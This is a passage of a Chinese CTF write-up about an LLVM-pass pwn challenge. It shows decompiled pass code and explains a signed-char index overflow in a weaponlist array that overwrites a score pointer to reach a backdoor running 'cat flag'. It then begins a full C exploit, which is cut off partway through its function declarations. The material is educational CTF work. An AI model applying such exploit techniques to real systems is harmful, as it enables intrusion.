class="number">0</span>);</span><br><span class="line">  v18 = llvm::CallBase::<span class="built_in">getArgOperand</span>(v60, <span class="number">0</span>);</span><br><span class="line">  v43 = (llvm::ConstantInt *)llvm::<span class="built_in">dyn_cast</span>&lt;llvm::ConstantInt,llvm::Value&gt;(v18);</span><br><span class="line">  v45 = llvm::ConstantInt::<span class="built_in">getZExtValue</span>(v43);</span><br><span class="line">  <span class="keyword">for</span> ( k = <span class="number">0</span>; k &lt; <span class="number">256</span>; ++k )</span><br><span class="line">    weaponlist[k] += v45;</span><br><span class="line">  v19 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;upgrade finish&quot;</span>);</span><br><span class="line">  std::ostream::<span class="keyword">operator</span>&lt;&lt;(v19, &amp;std::endl&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">  v20 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;enjoy your war&quot;</span>);</span><br><span class="line">  std::ostream::<span class="keyword">operator</span>&lt;&lt;(v20, &amp;std::endl&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>下面是一系列关于原神梗的函数（原神<code>56</code>级玩家）：  </p><img src="/2024/03/15/llvm/9.png" class="" title="我的图图呢">  <p>可以看出这一系列函数允许我们对<code>cmd</code>这个全局变量进行操作，所以我们可以通过对这几个函数的顺序进行适当的排序即可令<code>cmd</code>为我们想要的值<br>我们可以通过下面这段代码将<code>cmd</code>的值设置为<code>&quot;cat flag&quot;</code>  </p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">tiandongwanxiang</span>();</span><br><span class="line"><span class="built_in">wuxiangdeyidao</span>();</span><br><span class="line"><span class="built_in">guobapenhuo</span>();</span><br><span class="line"><span class="built_in">wuxiangdeyidao</span>();</span><br></pre></td></tr></table></figure><p>效果如下：  </p><img src="/2024/03/15/llvm/10.png" class="" title="我的图图呢">  <p>接下来是最重要的部分，当函数的名字不满足上述的所有条件后才会执行以下这段代码：  </p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  v37 = <span class="number">0</span>;</span><br><span class="line">  v36 = llvm::CallBase::<span class="built_in">getNumOperands</span>(v60);<span class="comment">// 获取函数的参数个数</span></span><br><span class="line">  <span class="keyword">if</span> ( v36 != <span class="number">2</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  v21 = llvm::CallBase::<span class="built_in">getArgOperand</span>(v60, <span class="number">0</span>);</span><br><span class="line">  v35 = (llvm::ConstantInt *)llvm::<span class="built_in">dyn_cast</span>&lt;llvm::ConstantInt,llvm::Value&gt;(v21);</span><br><span class="line">  v37 = llvm::ConstantInt::<span class="built_in">getZExtValue</span>(v35);<span class="comment">// 获取函数的第一个参数</span></span><br><span class="line">  v34 = std::map&lt;std::string,<span class="type">unsigned</span> <span class="type">char</span>&gt;::<span class="built_in">begin</span>(&amp;funMap[abi:cxx11]);<span class="comment">// v34为map的迭代器，指向begin</span></span><br><span class="line">  v33 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;                                 <span class="comment">// _Rb_tree_iterator为红黑树迭代器，map的底层即为红黑树</span></span><br><span class="line">    v32 = std::map&lt;std::string,<span class="type">unsigned</span> <span class="type">char</span>&gt;::<span class="built_in">end</span>(&amp;funMap[abi:cxx11]);</span><br><span class="line">    <span class="keyword">if</span> ( (std::_Rb_tree_iterator&lt;std::pair&lt;std::string <span class="type">const</span>,<span class="type">unsigned</span> <span class="type">char</span>&gt;&gt;::<span class="keyword">operator</span>!=(&amp;v34, &amp;v32) &amp; <span class="number">1</span>) == <span class="number">0</span> )</span><br><span class="line">      <span class="keyword">break</span>;                        <span class="comment">// 如果迭代器到达map的尾端着退出循环</span></span><br><span class="line">    v22 = std::_Rb_tree_iterator&lt;std::pair&lt;std::string <span class="type">const</span>,<span class="type">unsigned</span> <span class="type">char</span>&gt;&gt;::<span class="keyword">operator</span>-&gt;(&amp;v34);<span class="comment">// </span></span><br><span class="line">                                    <span class="comment">// 将v34这个std::pair&lt;std::string const,unsigned char&gt;类型对象赋值给v22</span></span><br><span class="line">    <span class="keyword">if</span> ( (std::<span class="keyword">operator</span>==&lt;<span class="type">char</span>&gt;(v22, v58) &amp; <span class="number">1</span>) != <span class="number">0</span> )<span class="comment">// v58为函数名</span></span><br><span class="line">    &#123;                               <span class="comment">// map中存在该函数名</span></span><br><span class="line">      v23 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(</span><br><span class="line">              &amp;std::cout,</span><br><span class="line">              <span class="string">&quot;you really want this?all right,i will add it into the weapon list&quot;</span>);</span><br><span class="line">      std::ostream::<span class="keyword">operator</span>&lt;&lt;(v23, &amp;std::endl&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">      v24 = std::_Rb_tree_iterator&lt;std::pair&lt;std::string <span class="type">const</span>,<span class="type">unsigned</span> <span class="type">char</span>&gt;&gt;::<span class="keyword">operator</span>-&gt;(&amp;v34);</span><br><span class="line">      weaponlist[v33] = *(_BYTE *)(v24 + <span class="number">0x20</span>);<span class="comment">// 将value赋值给weaponlist，漏洞出现的地方</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ++v33;                          <span class="comment">// 用于记录map中已经存在的函数个数</span></span><br><span class="line">    v31[<span class="number">1</span>] = std::_Rb_tree_iterator&lt;std::pair&lt;std::string <span class="type">const</span>,<span class="type">unsigned</span> <span class="type">char</span>&gt;&gt;::<span class="keyword">operator</span>++(&amp;v34, <span class="number">0LL</span>);</span><br><span class="line">    <span class="comment">// 将v34迭代器向前推进一个位置</span></span><br><span class="line">  &#125;</span><br><span class="line">  v31[<span class="number">0</span>] = std::map&lt;std::string,<span class="type">unsigned</span> <span class="type">char</span>&gt;::<span class="built_in">end</span>(&amp;funMap[abi:cxx11]);</span><br><span class="line">  <span class="keyword">if</span> ( (std::_Rb_tree_iterator&lt;std::pair&lt;std::string <span class="type">const</span>,<span class="type">unsigned</span> <span class="type">char</span>&gt;&gt;::<span class="keyword">operator</span>==(&amp;v34, v31) &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">  &#123;                                 <span class="comment">// 当前函数不存在map中，输出</span></span><br><span class="line">    v25 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;wow!! you find a new weapon&quot;</span>);</span><br><span class="line">    std::ostream::<span class="keyword">operator</span>&lt;&lt;(v25, &amp;std::endl&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">  &#125;</span><br><span class="line">  v28 = v37;</span><br><span class="line">  v29[<span class="number">0</span>] = llvm::Value::<span class="built_in">getName</span>(CalledFunction);<span class="comment">// 获取函数名</span></span><br><span class="line">  v29[<span class="number">1</span>] = v26;                     <span class="comment">// 处理函数的参数</span></span><br><span class="line">  llvm::<span class="function">StringRef::<span class="keyword">operator</span> <span class="title">std::string</span><span class="params">(v30, v29)</span></span>;<span class="comment">// 将v29转换为StringRef类型对象后存储在v30中</span></span><br><span class="line">  *(_BYTE *)std::map&lt;std::string,<span class="type">unsigned</span> <span class="type">char</span>&gt;::<span class="keyword">operator</span>[](&amp;funMap[abi:cxx11], v30) = v28;<span class="comment">// 将该函数插入map中</span></span><br><span class="line">  std::string::~<span class="built_in">string</span>(v30);</span><br><span class="line">&#125;</span><br><span class="line">std::string::~<span class="built_in">string</span>(v58);</span><br></pre></td></tr></table></figure><p>由于比较重要，所以代码中写了很多注释，下面就只讲讲几个比较重要的点：<br>代码中遍历的时候是按照函数名大小遍历的，所以我们在利用该段代码的时候要注意函数的命名<br>漏洞出现在<code>weaponlist[v33] = *(_BYTE *)(v24 + 0x20);</code>这一段代码<br>该<code>weaponlist</code>数组是通过<code>char</code>类型的<code>v33</code>进行索引的，而有符号<code>char</code>类型的范围是<code>-128 ~ +127</code>，也就是说，当<code>v33</code>的值为<code>127</code>时，此时加<code>1</code>，<code>v33</code>的值会变成<code>-128</code>而不是<code>128</code>，所以我们可以利用这个点来造成数组后溢来修改后面的值<br>在<code>weaponlist</code>数组后存在的数据：  </p><img src="/2024/03/15/llvm/11.png" class="" title="我的图图呢">  <p>可以看见<code>score</code>指针就在其后面，如果我们可以利用数组后溢来改写<code>score</code>指针指向一个很大的值的地址，那么我们在使用<code>fight</code>函数时就可以满足<code>backdoor</code>函数的调用条件从而进入<code>backdoor</code>函数，而<code>cmd</code>已经在前面被我们改写成<code>&quot;cat flag&quot;</code>，所以进入<code>backdoor</code>函数后我们即可获得<code>flag</code><br>完整<code>exp</code>如下：  </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// clang-8 -emit-llvm -S exp.c -o exp.ll</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">wuxiangdeyidao</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">guobapenhuo</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">tiandongwanxiang</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">fight</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux000</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux001</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux002</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux003</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux004</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux005</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux006</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux007</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux008</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux009</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux010</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux011</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux012</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux013</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux014</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux015</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux016</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux017</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux018</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux019</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux020</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux021</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux022</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux023</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux024</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux025</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux026</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux027</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux028</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux029</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux030</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux031</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux032</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux033</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux034</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux035</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux036</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux037</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux038</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux039</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux040</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux041</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux042</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux043</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux044</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux045</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux046</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux047</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux048</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux049</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux050</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux051</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux052</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux053</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux054</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux055</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux056</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux057</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux058</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux059</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux060</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux061</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux062</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title 